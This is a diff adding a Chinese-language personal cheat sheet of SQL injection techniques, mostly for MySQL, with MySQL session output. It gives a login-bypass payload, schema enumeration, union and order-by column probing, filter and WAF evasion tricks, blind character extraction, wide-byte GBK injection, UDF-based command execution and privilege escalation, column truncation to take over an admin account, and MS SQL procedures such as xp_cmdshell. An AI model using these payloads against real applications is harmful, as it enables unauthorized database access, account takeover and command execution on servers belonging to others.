@@ -1,0 +1,136 @@
+note：
+在执行类似注入是 select * from user where username = 'admin' and password ='123'
+'a or 1=1 -- (注意-- 有时候--后面需要有一个空格)，另外 如果1=1不成立，可以尝试2=2,3=3等绕过waf规则。
+
+1、查询所有mysql数据库
+select schema_name from information_schema.schemata;
+2、查询所有mysql特定数据库中所有表
+select table_name from information_schema.tables where table_schema = 'information_schema';
+3、查询所有mysql具体数据库具体表的所有字段名
+select column_name from information_schema.columns where table_schema = 'information_schema' and table_name = 'tables';
+4、查询当前数据库
+select database();
+5、查询指定库所有表面，但是连接在一起，用group_concat()
+ select group_concat(table_name) from information_schema.tables where table_schema = 'information_schema';
+ 
+ 6、查询当前user, 版本，数据库路径，操作系统版本
+ select user(); select version(); select @@version; select @@datadir;select @@version_compile_os;
+	 1:system_user()
+	2:user()    返回MYSQL用户名 
+	3:current_user()
+	4:session_user()
+	5:database()   返回当前数据库名
+	6:version()    返回当前数据库版本信息
+	7:load_file()    返回文件的内容
+
+7、判断一次查询，查询了多少个字段可以用union（如果是select * ，就可以用union判断这个表有多少个字段）
+尝试：
+mysql> select schema_name, sql_path from information_schema.schemata union select 1(或者union select null);
+ERROR 1222 (21000): The used SELECT statements have a different number of columns---------------不是一行
+正确：
+mysql> select schema_name, sql_path from information_schema.schemata union select 1,2;
++--------------------+----------+
+| schema_name        | sql_path |
++--------------------+----------+
+| information_schema | NULL     |
+| etron_v2           | NULL     |
+| mysql              | NULL     |
+| performance_schema | NULL     |
+| quit               | NULL     |
+| sakila             | NULL     |
+| sakura             | NULL     |
+| test               | NULL     |
+| world              | NULL     |
+| 1                  | 2        |
++--------------------+----------+
+10 rows in set (0.00 sec)
+
+8、同理判断一次查询，查询了多少字段也可以用order by
+试探：
+mysql> select * from schemata order by 1,2,3,4,5,6,7,8,9;
+ERROR 1054 (42S22): Unknown column '6' in 'order clause'------------这里错误显示不存在column 6
+正确：
+mysql> select * from information_schema.schemata order by 1,2,3,4,5;
++--------------+--------------------+----------------------------+------------------------+----------+
+| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
++--------------+--------------------+----------------------------+------------------------+----------+
+| def          | etron_v2           | utf8                       | utf8_general_ci        | NULL     |
+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | mysql              | utf8                       | utf8_general_ci        | NULL     |
+| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
+| def          | quit               | utf8                       | utf8_general_ci        | NULL     |
+| def          | sakila             | utf8                       | utf8_general_ci        | NULL     |
+| def          | sakura             | utf8                       | utf8_general_ci        | NULL     |
+| def          | test               | utf8                       | utf8_general_ci        | NULL     |
+| def          | world              | utf8                       | utf8_general_ci        | NULL     |
++--------------+--------------------+----------------------------+------------------------+----------+
+
+9、判断字段在前端显示的位置（不成立条件 + union数字）
+mysql> select * from schemata where schema_name = 'aaa' union select 1,2,3,4,5;
++--------------+-------------+----------------------------+------------------------+----------+
+| CATALOG_NAME | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
++--------------+-------------+----------------------------+------------------------+----------+
+| 1            | 2           | 3                          | 4                      | 5        |
++--------------+-------------+----------------------------+------------------------+----------+
+1 row in set (0.00 sec)
+
+10、 利用union反查（这种情况是我们不知道查询的条件，但是知道查询的表和字段名）
+mysql> select sql_path,schema_name  from schemata where schema_name='aaa' union select 1,schema_name from schemata;
++----------+--------------------+
+| sql_path | schema_name        |
++----------+--------------------+
+| 1        | information_schema |
+| 1        | etron_v2           |
+| 1        | mysql              |
+| 1        | performance_schema |
+| 1        | quit               |
+| 1        | sakila             |
+| 1        | sakura             |
+| 1        | test               |
+| 1        | world              |
++----------+--------------------+
+9 rows in set (0.00 sec)
+11、利用过滤绕过检测（如数据库查询接口过滤了<>）
+u<>ni<>on s<>el<>ect 1,2,3。
+2、利用注释绕过空格过滤
+s/*foo*/elEct/*foo*/null/*foo*/--
+3、转译绕过
+SelEct uSer FRom UsEr， SELSELSELSELECT，%00select，或者其他格式的编码如hex、unicode、ascii等
+4、连接字符绕过
+select name from user where name = concat('a','b'),select 'a' 'b' 'c'
+5、对于使用转义的情况，如使用单引号等不引起异常，那么字符串类型的攻击可能不行，但是数字格式的可能还存在漏洞，
+这样就可以利用以下函数：
+ascii
+substring（oracle为substr）结合在一起以数字形式从一个字符串中提取单独一个字符，如
+substring（'Admin',1,1）返回A，ascii('A')返回65，因此ascii(substring('Admin',1,1))返回65
+6、带外通道（其实就是建立网络连接，然后把数据传回来），这种情况是对于存在漏洞，但是无回显的情况，mysql可以
+使用select ...into outfile，如select * into outfile '/home/xxx/xxx.sql' from user;
+7、引发条件性错误，注入一个查询引发一个数据库错误，如 select x from y where c，这条语句会访问y的每一行，评估
+条件c，如果c为真返回x，如果c永为假，永远不求表达式x的值，如oracle数据库判断是否存在用户dbsnmp
+select 1/0 from dual where (select username from all_users where username = 'dbsnmp') = 'dbsnmp',如果
+不存在就会触发数据库错误，如果存在就不会。
+8、宽字节注入原理即是利用编码转换，将服务器端强制添加的本来用于转义的\符号吃掉，
+从而能使攻击者输入的引号起到闭合作用，以至于可以进行SQL注入（在mysql中，用于转义（即在字符串中的符号前加上”\”）
+的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，
+宽字节注入原理：
+GBK 占用两字节，ASCII占用一字节
+宽字节，多字节注入
+PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。
+大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，
+变成了 %df\’，其中\的十六进制是 0x5C ，那么现在 %df\’ =%df%5c%27(0xdf5c27)，
+如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，
+会认为 %df%5c(0xdf57) 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27(0xdf5c27)=縗’，结果导致
+转义字符\被“吃掉了”，于是剩下了单引号，有了单引号就形成注入了。
+
+9、UDF注入：用户可以自定义函数（基于mysql导出的api），自定义函数可以实现执行任意命令功能，编译后形成库，然后通过mysql
+导入，即可实现任意命令执行，如果mysql是基于root执行的，则可以直接提权。
+
+10、mysql sql column truncation（截断），当mysql的sql-mode设置为default时，即没有开启strict_all_tables选项时，mysql对于
+用户插入的唱过长度的字段会提示warning而不是error，而导致插入成功，但是字符被截短。
+如insert into user(username, password)  values('admin                                           x', 'new_pass')导致
+插入username为admin，密码为new_pass的用户。
+
+################################################################################
+MS SQL
+xp_cmdshell（执行任意命令）、xp_regread(操作注册表)、xp_servicecontrol（启动、停止服务）xp_xxxxxxx等存储过程。
+
